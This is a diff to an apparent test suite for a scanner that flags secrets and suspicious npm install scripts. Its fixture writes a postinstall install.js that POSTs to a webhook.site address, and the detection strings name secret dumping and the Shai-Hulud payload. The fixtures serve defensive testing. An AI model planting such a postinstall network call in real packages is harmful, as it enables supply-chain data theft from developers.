@@ -71,9 +71,14 @@ async function fakeHome() {
     line({ name: "esbuild", scripts: { postinstall: "node install.js" } }),
   );
   await Bun.write(
-    join(project, "node_modules/esbuild-fork/package.json"),
-    line({ name: "esbuild", scripts: { postinstall: "node install.js && node x.js" } }),
+    join(project, "node_modules/esbuild/install.js"),
+    "fetch('https://webhook.site/fake-quench', { method: 'POST' });\n",
   );
+  await Bun.write(
+    join(project, "node_modules/esbuild-fork/package.json"),
+    line({ name: "esbuild", scripts: { postinstall: "node install.js" } }),
+  );
+  await Bun.write(join(project, "node_modules/esbuild-fork/install.js"), "require('./lib');\n");
   await Bun.write(
     join(project, "node_modules/fresh-dep/package.json"),
     line({ name: "fresh-dep", scripts: { preinstall: "node scripts/setup.js" } }),
@@ -265,7 +270,8 @@ test("secrets reports history, configs, permissions, files and footprints withou
 
   expect(report.footprints.map((f: { reason: string }) => f.reason).sort()).toEqual([
     "dumps every repository secret with toJSON(secrets)",
-    "postinstall added in the last 30 days: node install.js && node x.js",
+    "postinstall added in the last 30 days: node install.js",
+    "postinstall added in the last 30 days: node install.js",
     "postinstall runs bundle.js, the Shai-Hulud payload",
     "preinstall added in the last 30 days: node scripts/setup.js",
   ]);
@@ -300,6 +306,17 @@ test("findings keep their ids across runs and each value lists where it lives", 
     envVars: ["QUENCH_FAKE_GH"],
   });
   expect(where.sessions).toHaveLength(1);
+});
+
+test("footprint ids do not change with --days", async () => {
+  const { home } = await fakeHome();
+  const ids = async (days: string) =>
+    JSON.parse((await run(home, "--json", "--days", days)).stdout).footprints.map(
+      (f: { kind: string; id: string }) => [f.kind, f.id],
+    );
+  const month = await ids("30");
+  expect(month.map(([kind]: string[]) => kind)).toContain("new-install-script");
+  expect(await ids("90")).toEqual(month);
 });
 
 test("secrets text output masks every value", async () => {
